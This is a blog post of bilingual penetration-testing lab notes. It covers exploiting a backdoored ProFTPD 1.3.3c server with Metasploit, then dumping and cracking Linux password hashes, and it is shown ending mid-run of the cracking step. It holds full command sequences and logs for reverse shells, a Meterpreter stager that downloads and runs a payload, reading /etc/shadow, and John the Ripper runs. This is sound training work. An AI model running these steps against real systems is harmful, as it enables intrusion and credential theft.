---
layout: post
title: "Dumping Linux Password Hashes"
date: "2022-11-04"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - System/Host Based Attacks
---

# Dumping Linux Password Hashes
## Linux Password Hashes
Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.

All of the information for all accounts on Linux is stored in the passwd file located in: `/etc/passwd`.

We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system.

All the encrypted passwords for the users are stored in the shadow file. It can be found in the following directory: `/etc/shadow`.

The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed password.

The passwd file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol (`$`).

|Value|Hashing Algorithm|
|---|---|
|$1|MD5|
|$2|Blowfish|
|$5|SHA-256|
|$6|SHA-512|

# 转储 Linux 密码哈希
## Linux 密码哈希
Linux 具有多用户支持，因此，多个用户可以同时访问系统。 从安全角度来看，这既是优点也是缺点，因为多个帐户为攻击者提供了多种访问途径，因此增加了服务器的整体风险。

Linux 上所有帐户的所有信息都存储在位于 `/etc/passwd` 的 passwd 文件中。

我们无法查看 passwd 文件中用户的密码，因为它们是加密的，并且系统上的任何用户都可以读取 passwd 文件。

用户的所有加密密码都存储在影子文件中。 它可以在以下目录中找到：`/etc/shadow`。

影子文件只能由 root 帐户访问和读取，这是一项非常重要的安全功能，因为它可以防止系统上的其他帐户访问散列密码。

passwd 文件为我们提供了有关正在使用的哈希算法和密码哈希的信息，这非常有帮助，因为我们能够确定正在使用的哈希算法的类型及其强度。 我们可以通过查看由美元符号 (`$`) 封装的用户名后面的数字来确定这一点。

|值|哈希算法|
|---|---|
|$1|MD5|
|$2|Blowfish|
|$5|SHA-256|
|$6|SHA-512|

Whenever you list out the contents of the shadow file, you'll get the actual hashed password. But the hashed password will have a prefix that is going to be encapsulated or rather, it's going to be a prefix that contains the `$` symbol. And then after that, there's going to be a value that will actually tell you what type of hashing algorithm was used to encrypt that password.

# Demo: Linux Password Hashes
```
ifconfig
eth1: inet 192.44.156.2
```

```
nmap 192.44.156.3
PORT    STATE   SERVICE VERSION
21/tcp  open    ftp     ProFTPD 1.3.3c
```

```
searchsploit ProFTPD
```

I'm going to set the global variable for the RHOSTS option to the target IP.

```
service postgresql start && msfconsole
setg RHOSTS 192.44.156.3
search proftpd
use exploit/unix/ftp/proftpd_133c_backdoor
show options
exploit
```

And we should obtain a command shell session, which we can then upgrade to a Meterpreter session.

So we get a command shell session, `/bin/bash -i` to obtain a bash session. So this particular exploit essentially provided us with elevated privileges.

Put this in the background.

```
/bin/bash -i
root@victim-1:/# id
root@victim-1:/# ^Z
```

I can upgrade that session to a Meterpreter session using the command `sessions -u 1`. (Note: `-u`=upgrade)

```
sessions
sessions -u 1
```

So it looks like we obtained a Meterpreter session, and we got an error. 

`getuid` to verify that we have root access. The user ID `uid` is set to 0, which is the root user.

```
sessions
sessions 2
meterpreter > sysinfo
meterpreter > getuid
```

The first technique is the ability to display the contents of the shadow file. 

Because the root user account is the only user account on the system, the rest of them are service accounts.

The hashing algorithm value will be encapsulated in symbols. And in this case, the value is `6`, which tells us that this particular password has been encrypted using the SHA-512 hashing algorithm.

```
meterpreter > cat /etc/shadow
```

The other technique we can use with the Metasploit framework is the `hashdump` moudle.

```
meterpreter > 
Background session 2? [y/N]
search hashdump
use post/linux/gather/hashdump
show options
set SESSION 2
run
```

This will automatically get all the user accounts that have passwords, and it'll essentially provide you with the hashed passwords. And it'll save them for you within the following file here. So it's going to the unshadow the password file. The unshadow password file essentially means that this module has formatted this particular hashed password into a format that can be cracked or that is ready to be cracked.

If you have an Meterpreter session, you can utilize the hashdump module, or you can dump the hashes manually by simply displaying the contents of the shadow file.

# 密码破解者：Linux
## 概述
在本实验中，针对目标运行以下辅助模块：
* auxiliary/analyze/crack_linux

指示： 
* 这个实验室是献给你的！此网络上没有其他用户 :)
* 开始实验室后，您将可以访问 Kali 实例的根终端
* 你的 Kali 有一个 IP 地址为 192.XY2 的接口。运行“ip addr”以了解 X 和 Y 的值。
* 目标服务器应位于 IP 地址 192.XY3。
* 不要攻击位于 IP 地址 192.XY1 的网关
* 使用`/usr/share/metasploit-framework/data/wordlists/unix_users.txt`作为用户名字典


## 解决方案
此实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-1776.pdf

## 我自己的思路
```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.11  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:0b  txqueuelen 0  (Ethernet)
        RX packets 122  bytes 10932 (10.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 105  bytes 343607 (335.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.87.136.2  netmask 255.255.255.0  broadcast 192.87.136.255
        ether 02:42:c0:57:88:02  txqueuelen 0  (Ethernet)
        RX packets 16  bytes 1376 (1.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```
root@attackdefense:~# nmap -sV 192.87.136.3
Starting Nmap 7.70 ( https://nmap.org ) at 2022-11-04 10:48 UTC
Nmap scan report for target-1 (192.87.136.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
MAC Address: 02:42:C0:57:88:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
```

```
root@attackdefense:~# searchsploit ProFTPD
-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                    |  Path
                                                                                                                                                  | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
FreeBSD - 'ftpd / ProFTPd' Remote Command Execution                                                                                               | exploits/freebsd/remote/18181.txt
ProFTPd 1.2.0 pre10 - Remote Denial of Service                                                                                                    | exploits/linux/dos/244.java
ProFTPd 1.2.0 rc2 - Memory Leakage                                                                                                                | exploits/linux/dos/241.c
ProFTPd 1.2.10 - Remote Users Enumeration                                                                                                         | exploits/linux/remote/581.c
ProFTPd 1.2 < 1.3.0 (Linux) - 'sreplace' Remote Buffer Overflow (Metasploit)                                                                      | exploits/linux/remote/16852.rb
ProFTPd 1.2.7/1.2.8 - '.ASCII' File Transfer Buffer Overrun                                                                                       | exploits/linux/dos/23170.c
ProFTPd 1.2.7 < 1.2.9rc2 - Remote Code Execution / Brute Force                                                                                    | exploits/linux/remote/110.c
ProFTPd 1.2.9 RC1 - 'mod_sql' SQL Injection                                                                                                       | exploits/linux/remote/43.pl
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (1)                                                                                       | exploits/linux/remote/107.c
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (2)                                                                                       | exploits/linux/remote/3021.txt
ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (1)                                                                                 | exploits/linux/remote/19475.c
ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (2)                                                                                 | exploits/linux/remote/19476.c
ProFTPd 1.2 pre6 - 'snprintf' Remote Root                                                                                                         | exploits/linux/remote/19503.txt
ProFTPd 1.2 - 'SIZE' Remote Denial of Service                                                                                                     | exploits/linux/dos/20536.java
ProFTPd 1.2.x - 'STAT' Denial of Service                                                                                                          | exploits/linux/dos/22079.sh
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' exec-shield Local Overflow                                                                                     | exploits/linux/local/3730.txt
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (1)                                                                            | exploits/linux/local/3330.pl
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (2)                                                                            | exploits/linux/local/3333.pl
ProFTPd 1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (PoC)                                                                                | exploits/linux/dos/2928.py
ProFTPd 1.3.0 (OpenSUSE) - 'mod_ctrls' Local Stack Overflow                                                                                       | exploits/unix/local/10044.pl
ProFTPd 1.3.0 - 'sreplace' Remote Stack Overflow (Metasploit)                                                                                     | exploits/linux/remote/2856.pm
ProFTPd 1.3.2 rc3 < 1.3.3b (FreeBSD) - Telnet IAC Buffer Overflow (Metasploit)                                                                    | exploits/linux/remote/16878.rb
ProFTPd 1.3.2 rc3 < 1.3.3b (Linux) - Telnet IAC Buffer Overflow (Metasploit)                                                                      | exploits/linux/remote/16851.rb
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                                          | exploits/linux/remote/16921.rb
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                                                | exploits/linux/remote/15662.txt
ProFTPd 1.3.5 - File Copy                                                                                                                         | exploits/linux/remote/36742.txt
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                         | exploits/linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                               | exploits/linux/remote/36803.py
ProFTPd 1.3 - 'mod_sql' 'Username' SQL Injection                                                                                                  | exploits/multiple/remote/32798.pl
ProFTPd 1.x - 'mod_tls' Remote Buffer Overflow                                                                                                    | exploits/linux/remote/4312.c
ProFTPd - 'ftpdctl' 'pr_ctrls_connect' Local Overflow                                                                                             | exploits/linux/local/394.c
ProFTPd IAC 1.3.x - Remote Command Execution                                                                                                      | exploits/linux/remote/15449.pl
ProFTPd - 'mod_mysql' Authentication Bypass                                                                                                       | exploits/multiple/remote/8037.txt
ProFTPd - 'mod_sftp' Integer Overflow Denial of Service (PoC)                                                                                     | exploits/linux/dos/16129.txt
WU-FTPD 2.4/2.5/2.6 / Trolltech ftpd 1.2 / ProFTPd 1.2 / BeroFTPD 1.3.4 FTP - glob Expansion                                                      | exploits/linux/remote/20690.sh
WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (1)                                                  | exploits/linux/remote/19086.c
WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (2)                                                  | exploits/linux/remote/19087.c
-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
```

We use `ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)` module.

[ProFTPD-1.3.3c Backdoor Command Execution](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor/)

ProFTPD-1.3.3c 后门命令执行

该模块利用了添加到 ProFTPD 下载存档中的恶意后门。这个后门存在于 2010 年 11 月 28 日至 2010 年 12 月 2 日之间的 proftpd-1.3.3c.tar.[bz2|gz] 存档中。

[Exploits/proftpd-1.3.3c-backdoor](https://www.aldeid.com/wiki/Exploits/proftpd-1.3.3c-backdoor)

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > search proftpd

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   3  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   4  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   5  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution


msf5 > use exploit/unix/ftp/proftpd_133c_backdoor
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > show options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/proftpd_133c_backdoor) > setg RHOSTS 192.87.136.3
RHOSTS => 192.87.136.3
```

```
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > exploit

[*] Started reverse TCP double handler on 192.87.136.2:4444 
[*] 192.87.136.3:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo dhpqako5jNi3VQor;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "dhpqako5jNi3VQor\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.87.136.2:4444 -> 192.87.136.3:33826) at 2022-11-04 10:53:58 +0000

/bin/bash -i
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/# whoami
whoami
root
root@victim-1:/# groups root
groups root
root : root
```

```
root@victim-1:/# ^Z   
Background session 1? [y/N]  y
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.87.136.2:4444 -> 192.87.136.3:33826 (192.87.136.3)
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.87.136.2:4433 
[*] Sending stage (980808 bytes) to 192.87.136.3
[*] Meterpreter session 2 opened (192.87.136.2:4433 -> 192.87.136.3:40292) at 2022-11-04 10:58:04 +0000
[-] Error: Unable to execute the following command: "echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towFeIAmgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/qnXtu.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/vUGNo' < '/tmp/qnXtu.b64' ; chmod +x '/tmp/vUGNo' ; '/tmp/vUGNo' & sleep 2 ; rm -f '/tmp/vUGNo' ; rm -f '/tmp/qnXtu.b64'"
[-] Output: "[1] 39"
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                       Connection
  --  ----  ----                   -----------                                                       ----------
  1         shell cmd/unix                                                                           192.87.136.2:4444 -> 192.87.136.3:33826 (192.87.136.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.87.136.3  192.87.136.2:4433 -> 192.87.136.3:40292 (192.87.136.3)
```

```
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 192.87.136.3
OS           : Ubuntu 18.04 (Linux 5.4.0-125-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0)
meterpreter > cat /etc/shadow
root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
daemon:*:18311:0:99999:7:::
bin:*:18311:0:99999:7:::
sys:*:18311:0:99999:7:::
sync:*:18311:0:99999:7:::
games:*:18311:0:99999:7:::
man:*:18311:0:99999:7:::
lp:*:18311:0:99999:7:::
mail:*:18311:0:99999:7:::
news:*:18311:0:99999:7:::
uucp:*:18311:0:99999:7:::
proxy:*:18311:0:99999:7:::
www-data:*:18311:0:99999:7:::
backup:*:18311:0:99999:7:::
list:*:18311:0:99999:7:::
irc:*:18311:0:99999:7:::
gnats:*:18311:0:99999:7:::
nobody:*:18311:0:99999:7:::
_apt:*:18311:0:99999:7:::
```

```
meterpreter > 
Background session 2? [y/N]  y
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > search hashdump

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   0   auxiliary/analyze/crack_databases                                      normal  No     Password Cracker: Databases
   1   auxiliary/scanner/mssql/mssql_hashdump                                 normal  No     MSSQL Password Hashdump
   2   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal  No     MySQL Authentication Bypass Password Dump
   3   auxiliary/scanner/mysql/mysql_hashdump                                 normal  No     MYSQL Password Hashdump
   4   auxiliary/scanner/oracle/oracle_hashdump                               normal  No     Oracle Password Hashdump
   5   auxiliary/scanner/postgres/postgres_hashdump                           normal  No     Postgres Password Hashdump
   6   auxiliary/scanner/smb/impacket/secretsdump                             normal  No     DCOM Exec
   7   post/aix/hashdump                                                      normal  No     AIX Gather Dump Password Hashes
   8   post/android/gather/hashdump                                           normal  No     Android Gather Dump Password Hashes for Android Systems
   9   post/bsd/gather/hashdump                                               normal  No     BSD Dump Password Hashes
   10  post/linux/gather/hashdump                                             normal  No     Linux Gather Dump Password Hashes for Linux Systems
   11  post/osx/gather/hashdump                                               normal  No     OS X Gather Mac OS X Password Hash Collector
   12  post/solaris/gather/hashdump                                           normal  No     Solaris Gather Dump Password Hashes for Solaris Systems
   13  post/windows/gather/credentials/domain_hashdump                        normal  No     Windows Domain Controller Hashdump
   14  post/windows/gather/credentials/mcafee_vse_hashdump                    normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
   15  post/windows/gather/credentials/mssql_local_hashdump                   normal  No     Windows Gather Local SQL Server Hash Dump
   16  post/windows/gather/hashdump                                           normal  No     Windows Gather Local User Account Password Hashes (Registry)
   17  post/windows/gather/smart_hashdump                                     normal  No     Windows Gather Local and Domain Controller Account Password Hashes

```

```
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > use post/linux/gather/hashdump
msf5 post(linux/gather/hashdump) > show options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/hashdump) > set SESSION 2
SESSION => 2
msf5 post(linux/gather/hashdump) > exploit

[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt
[*] Post module execution completed
```

In this lab, run the following auxiliary modules against the target:

`auxiliary/analyze/crack_linux`

[Password Cracker: Linux](https://www.rapid7.com/db/modules/auxiliary/analyze/crack_linux/)

密码破解者：Linux

该模块使用 John the Ripper 或 Hashcat 来识别从 Unix/Linux 系统的 unshadowed passwd 文件中获取的弱密码。默认情况下，该模块只会破解 MD5、BSDi 和 DES 实现。但是，它也可以破解 Blowfish 和 SHA(256/512)，但速度要慢得多。


```
root@attackdefense:~# msfconsole -q
msf5 > use auxiliary/analyze/crack_linux
msf5 auxiliary(analyze/crack_linux) > set sha512 true
sha512 => true
msf5 auxiliary(analyze/crack_linux) > show options

Module options (auxiliary/analyze/crack_linux):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   BLOWFISH              false            no        Include BLOWFISH hashes (Very Slow)
   BSDI                  true             no        Include BSDI hashes
   CONFIG                                 no        The path to a John config file to use instead of the default
   CRACKER_PATH                           no        The absolute path to the cracker executable
   CUSTOM_WORDLIST                        no        The path to an optional custom wordlist
   DES                   true             no        Indlude DES hashes
   FORK                  1                no        Forks for John the Ripper to use
   INCREMENTAL           true             no        Run in incremental mode
   ITERATION_TIMEOUT                      no        The max-run-time for each iteration of cracking
   KORELOGIC             false            no        Apply the KoreLogic rules to John the Ripper Wordlist Mode(slower)
   MD5                   true             no        Include MD5 hashes
   MUTATE                false            no        Apply common mutations to the Wordlist (SLOW)
   POT                                    no        The path to a John POT file to use instead of the default
   SHA256                false            no        Include SHA256 hashes (Very Slow)
   SHA512                true             no        Include SHA512 hashes (Very Slow)
   USE_CREDS             true             no        Use existing credential data saved in the database
   USE_DB_INFO           true             no        Use looted database schema info to seed the wordlist
   USE_DEFAULT_WORDLIST  true             no        Use the default metasploit wordlist
   USE_HOSTNAMES         true             no        Seed the wordlist with hostnames from the workspace
   USE_ROOT_WORDS        true             no        Use the Common Root Words Wordlist
   WORDLIST              true             no        Run in wordlist mode


Auxiliary action:

   Name  Description
   ----  -----------
   john  Use John the Ripper

msf5 auxiliary(analyze/crack_linux) > set POT /root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt
POT => /root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt
msf5 auxiliary(analyze/crack_linux) > set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_users.txt
CUSTOM_WORDLIST => /usr/share/metasploit-framework/data/wordlists/unix_users.txt
msf5 auxiliary(analyze/crack_linux) > run
Created directory: /root/.john

[+] john Version Detected: 1.9.0-jumbo-1 OMP
[*] Hashes Written out to /tmp/hashes_tmp20221104-435-1hmn0a
[*] Wordlist file written out to /tmp/jtrtmp20221104-435-qwpe1t
[*] Checking md5crypt hashes already cracked...
[*] Cracking md5crypt hashes in single mode...
[*]    Cracking Command: /usr/sbin/john --session=IXJKew9z --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=md5crypt --wordlist=/tmp/jtrtmp20221104-435-qwpe1t --rules=single /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking md5crypt hashes in normal mode
[*]    Cracking Command: /usr/sbin/john --session=IXJKew9z --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=md5crypt /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking md5crypt hashes in incremental mode...
[*]    Cracking Command: /usr/sbin/john --session=IXJKew9z --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=md5crypt --incremental=Digits /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking md5crypt hashes in wordlist mode...
[*]    Cracking Command: /usr/sbin/john --session=IXJKew9z --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=md5crypt --wordlist=/tmp/jtrtmp20221104-435-qwpe1t --rules=wordlist /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[+] Cracked Hashes
==============

 DB ID  Hash Type  Username  Cracked Password  Method
 -----  ---------  --------  ----------------  ------

[*] Checking descrypt hashes already cracked...
[*] Cracking descrypt hashes in single mode...
[*]    Cracking Command: /usr/sbin/john --session=AQpJ19oD --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=descrypt --wordlist=/tmp/jtrtmp20221104-435-qwpe1t --rules=single /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking descrypt hashes in normal mode
[*]    Cracking Command: /usr/sbin/john --session=AQpJ19oD --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=descrypt /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking descrypt hashes in incremental mode...
[*]    Cracking Command: /usr/sbin/john --session=AQpJ19oD --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=descrypt --incremental=Digits /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking descrypt hashes in wordlist mode...
[*]    Cracking Command: /usr/sbin/john --session=AQpJ19oD --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=descrypt --wordlist=/tmp/jtrtmp20221104-435-qwpe1t --rules=wordlist /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[+] Cracked Hashes
==============

 DB ID  Hash Type  Username  Cracked Password  Method
 -----  ---------  --------  ----------------  ------

[*] Checking bsdicrypt hashes already cracked...
[*] Cracking bsdicrypt hashes in single mode...
[*]    Cracking Command: /usr/sbin/john --session=6T1dWQjn --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=bsdicrypt --wordlist=/tmp/jtrtmp20221104-435-qwpe1t --rules=single /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking bsdicrypt hashes in normal mode
[*]    Cracking Command: /usr/sbin/john --session=6T1dWQjn --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=bsdicrypt /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking bsdicrypt hashes in incremental mode...
[*]    Cracking Command: /usr/sbin/john --session=6T1dWQjn --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=bsdicrypt --incremental=Digits /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking bsdicrypt hashes in wordlist mode...
[*]    Cracking Command: /usr/sbin/john --session=6T1dWQjn --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=bsdicrypt --wordlist=/tmp/jtrtmp20221104-435-qwpe1t --rules=wordlist /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[+] Cracked Hashes
==============

 DB ID  Hash Type  Username  Cracked Password  Method
 -----  ---------  --------  ----------------  ------

[*] Checking sha512crypt hashes already cracked...
[*] Cracking sha512crypt hashes in single mode...
[*]    Cracking Command: /usr/sbin/john --session=aTbJEJRg --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=sha512crypt --wordlist=/tmp/jtrtmp20221104-435-qwpe1t --rules=single /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
Will run 48 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1g 0:00:00:07 DONE (2022-11-04 11:25) 0.1253g/s 769.9p/s 769.9c/s 769.9C/s root..adornment
Use the "--show" option to display all of the cracked passwords reliably
Session completed
[*] Cracking sha512crypt hashes in normal mode
[*]    Cracking Command: /usr/sbin/john --session=aTbJEJRg --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=sha512crypt /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking sha512crypt hashes in incremental mode...
[*]    Cracking Command: /usr/sbin/john --session=aTbJEJRg --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/loot/20221104110700_default_192.87.136.3_linux.hashes_536998.txt --format=sha512crypt --incremental=Digits /tmp/hashes_tmp20221104-435-1hmn0a
Using default input encoding: UTF-8
[*] Cracking sha512crypt hashes in wordlist mode...
